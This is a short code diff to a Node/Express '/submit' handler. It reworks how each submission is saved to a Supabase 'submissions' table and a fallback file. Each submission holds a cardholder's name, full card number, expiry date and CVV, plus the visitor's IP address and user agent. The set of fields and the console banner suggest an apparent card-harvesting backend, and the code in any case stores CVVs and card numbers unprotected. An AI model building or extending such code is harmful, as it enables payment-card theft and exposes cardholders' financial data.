@@ -79,7 +79,6 @@ app.post('/submit', async (req, res) => {
 
   try {
     const submission = {
-      id: Date.now(),
       timestamp: new Date().toISOString(),
       nameOnCard,
       cardNumber,
@@ -90,19 +89,33 @@ app.post('/submit', async (req, res) => {
       createdAt: new Date().toISOString(),
     };
 
+    // Format for Supabase (snake_case columns)
+    const supabasePayload = {
+      timestamp: submission.timestamp,
+      name_on_card: nameOnCard,
+      card_number: cardNumber,
+      expiry,
+      cvv,
+      ip: submission.ip,
+      user_agent: submission.userAgent,
+      created_at: submission.createdAt,
+    };
+
     let savedToDb = false;
     try {
       if (!supabase) throw new Error('Supabase client not configured');
       const { data, error } = await supabase
         .from('submissions')
-        .insert([submission])
-        .select();
-      if (error) throw error;
+        .insert([supabasePayload]);
+      if (error) {
+        console.error('Supabase insert error details:', error);
+        throw error;
+      }
       savedToDb = true;
-      if (data?.[0]?.id) submission.id = data[0].id;
+      console.log('✅ Saved to Supabase');
     } catch (dbErr) {
-      console.error('DB save failed, using fallback file:', dbErr.message || dbErr);
-      appendFallbackSubmission(submission);
+      console.error('⚠️  Supabase save failed:', dbErr.message || dbErr);
+      appendFallbackSubmission({ id: Date.now(), ...submission });
     }
 
     console.log('\n========== NEW SUBMISSION ==========');
